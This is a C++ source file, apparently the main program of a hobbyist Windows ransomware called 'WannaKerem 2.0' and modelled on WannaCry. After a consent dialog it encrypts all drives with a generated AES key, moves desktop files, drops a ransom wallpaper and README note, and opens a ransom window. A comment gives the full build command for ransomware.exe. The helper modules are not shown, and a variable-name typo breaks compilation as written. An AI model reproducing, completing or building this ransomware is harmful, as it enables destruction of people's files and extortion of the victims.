#include "common.hpp"
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/crypto.h>
#include <shlobj.h>
#include <iostream>
#include <filesystem>


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    int response = MessageBoxA(NULL, "Do you want to start the Ransomware (it is highly malicious software that can and will corrupt your files) ?", "If you don't know anything about that software PRESS NO", MB_YESNO | MB_ICONQUESTION | MB_TOPMOST);
    if (response != IDYES) {
        return 0;
    }
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    try {
        SecureBuffer masterKey = generateAESKey();
        if (!IsEncryptionMarkerPresent()) {
            

            
        
            std::atomic<size_t> count(0), skipped(0);
            EncryptAllDrives(masterKey, true, count, skiped);

            

            wchar_t desktopPath[MAX_PATH];
            if (SUCCEEDED(SHGetSpecialFolderPathW(NULL, desktopPath, CSIDL_DESKTOP, FALSE))) {
                std::wstring wallpaperPath = std::wstring(desktopPath) + L"\\ransom_wallpaper.bmp";
                std::wstring readmePath = std::wstring(desktopPath) + L"\\READ_ME.txt";
                MoveDesktopItems(L"My_Encrypted_Files");
                GenerateWallpaperAndNote(wallpaperPath, readmePath);
                ShowSkull();
            }
            WriteEncryptedMasterKeyToFile(masterKey);
            CreateEncryptionMarker();
        }
        const wchar_t CLASS_NAME[] = L"WannaCryWindowClass";
        WNDCLASSW wc = {};
        if (!GetClassInfoW(hInstance, CLASS_NAME, &wc)) {
            wc.lpfnWndProc   = WannaCryWndProc;
            wc.hInstance     = hInstance;
            wc.lpszClassName = CLASS_NAME;
            wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));
            wc.hIcon         = LoadIcon(NULL, IDI_WARNING);
            wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
            RegisterClassW(&wc);
        }

        AppData appData;
        appData.hInstance = hInstance;
        appData.masterKey = &masterKey;

        HWND hwnd = CreateWindowExW(0, CLASS_NAME, L"WannaKerem 2.0",
                                    WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                                    CW_USEDEFAULT, CW_USEDEFAULT, 600, 400,
                                    NULL, NULL, hInstance, &appData);
        if (!hwnd) {
            MessageBoxW(NULL, L"We couldn't open a windows", L"Error", MB_OK | MB_ICONERROR);
            return 1;
        }

        ShowWindow(hwnd, nCmdShow);
        UpdateWindow(hwnd);

        MSG msg = {};
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

    } catch (const std::exception& ex) {
        MessageBoxW(NULL, std::wstring(L"Error: " + std::wstring(ex.what(), ex.what() + strlen(ex.what()))).c_str(),
                    L"Critical Error", MB_OK | MB_ICONERROR);
    }

    EVP_cleanup();
    CRYPTO_cleanup_all_ex_data();
    ERR_free_strings();

    return 0;
}//g++ -std=c++17 -O2 -IModules Modules/asymmetric.cpp Modules/symmetric.cpp Modules/other_functions.cpp Modules/visual.cpp ransomware.cpp -mwindows -lcrypto -lssl -Wdeprecated-declarations -lws2_32 -lgdi32 -lcrypt32 -lshlwapi -lstdc++fs -lole32 -lshell32 -luuid -static -o ransomware.exe